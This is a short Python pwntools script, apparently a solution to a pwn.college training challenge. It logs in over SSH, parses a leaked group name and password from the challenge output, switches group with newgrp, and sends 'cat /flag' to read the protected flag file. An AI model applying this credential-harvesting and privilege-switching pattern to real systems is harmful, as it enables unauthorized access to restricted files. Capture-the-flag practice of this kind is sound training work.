#!/usr/bin/python3

from pwn import *

s = ssh(host="dojo.pwn.college",user="hacker",keyfile='../../key')

io = s.process('/challenge/run')
data = io.recvall()
password = data.split(b': ')[2][:-1]
name = data.split(b'The password for ')[1].split(b' is')[0].decode().strip()

print(password,name)
io = s.process(['newgrp',name])

io.sendline(password)

io.sendline(b'cat /flag')
io.interactive()
